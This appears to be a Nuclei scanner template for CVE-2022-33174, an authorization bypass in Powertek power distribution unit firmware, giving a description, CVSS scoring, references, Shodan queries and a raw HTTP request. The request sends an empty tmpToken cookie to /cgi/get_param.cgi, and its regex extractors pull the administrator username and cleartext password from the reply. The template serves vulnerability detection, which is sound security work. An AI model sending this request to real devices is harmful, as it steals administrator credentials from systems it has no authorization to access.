id: CVE-2022-33174

info:
  name: Powertek Firmware <3.30.30 - Authorization Bypass
  author: pikpikcu
  severity: high
  description: |
    Powertek firmware (multiple brands) before 3.30.30 running Power Distribution Units are vulnerable to authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext.
  impact: |
    An attacker can bypass authentication and gain unauthorized access to the Powertek Firmware, potentially leading to further compromise of the system.
  remediation: |
    Upgrade the Powertek Firmware to version 3.30.30 or higher to mitigate the vulnerability.
  reference:
    - https://gynvael.coldwind.pl/?lang=en&id=748
    - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
    - https://github.com/Henry4E36/CVE-2022-33174
    - https://github.com/k0mi-tg/CVE-POC
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-33174
    cwe-id: CWE-863
    epss-score: 0.81715
    epss-percentile: 0.99138
    cpe: cpe:2.3:o:powertekpdus:basic_pdu_firmware:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: powertekpdus
    product: basic_pdu_firmware
    shodan-query:
      - http.html:"Powertek"
      - http.html:"powertek"
    fofa-query: body="powertek"
  tags: cve2022,cve,powertek,auth-bypass,powertekpdus,vuln

http:
  - raw:
      - |
        GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1
        Host: {{Hostname}}
        Cookie: tmpToken=;

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<sys.passwd>'
          - '<sys.su.name>'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        group: 1
        regex:
          - '<sys\.passwd>([A-Z0-9a-z]+)<\/sys\.passwd>'
          - '<sys\.su\.name>([a-z]+)<\/sys\.su\.name>'
        part: body
# digest: 4a0a00473045022100cce6ac80df3aeb77cc09e543c1eb2e05949aa6d1b37d69ce4208e9c1ad43bc390220443d7cf5def8f4cbdb0d8d44a5d44cca686e4921a7666b6e2777d2358cb9e01b:922c64590222798bb761d5b6d8e72950